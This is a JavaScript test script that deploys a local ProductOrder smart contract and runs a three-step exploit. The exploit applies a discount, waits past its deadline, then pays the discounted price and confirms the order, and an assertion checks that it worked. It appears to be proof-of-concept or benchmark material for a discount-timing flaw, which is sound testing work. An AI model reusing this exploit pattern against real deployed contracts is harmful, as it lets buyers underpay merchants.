require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');


// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let productOrderSource = fs.readFileSync(path.join(contractsDir, 'src', 'ProductOrder.sol'), 'utf8');

async function exploit(web3, envInfo) {
    // Preparations
    let solcVersion = extractSolcVersion(productOrderSource);
    let { abi, bytecode } = await compileWithVersion(productOrderSource, solcVersion);
    let parameters = [5];
    let contractInstance = await deployContract(web3, abi, bytecode, envInfo, parameters);

    // Step 1: Apply the discount just before the discountEndTime
    let step1Receipt = await contractInstance.methods.applyDiscount().send({ 
        from: web3.eth.accounts.wallet[0].address,
        gas: 300000 
    });

    if (step1Receipt.status) {
        console.log("Step 1 transaction was successful!");

        // Delay for 16 seconds
        console.log('Waiting for 7 seconds to bypass the deadline for product discount...')
        await new Promise(resolve => setTimeout(resolve, 7000));

        // Step 2: Get the discounted price and make a transaction to "payForOrder" function
        let discountedPrice = await contractInstance.methods.price().call();
        let step2Receipt = await contractInstance.methods.payForOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            value: discountedPrice, // Sending the discounted price as payment
            gas: 300000
        });

        if (step2Receipt.status) {
            console.log("Step 2 transaction was successful!");

            // Step 3: Execute confirmOrder function with no Ether value sent or params
            let step3Receipt = await contractInstance.methods.confirmOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                gas: 200000
            });

            if (step3Receipt.status) {
                console.log("Step 3 transaction was successful!");
                return true;
            } else {
                console.error("Step 3 transaction failed!");
                return false;
            }

        } else {
            console.error("Step 2 transaction failed!");
            return false;
        }

    } else {
        console.error("Step 1 transaction failed!");
        return false; 
    }
}

module.exports = async function runTests(web3, envInfo) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    try {
        assert.strictEqual(result, true, "Exploit did not yield the expected result");
        console.log(chalk.green("Exploit successful!"));  // Display the success message using chalk
    } catch (error) {
        console.error(chalk.red(error.message));  // Display the error message using chalk
    }

    return result; 
}
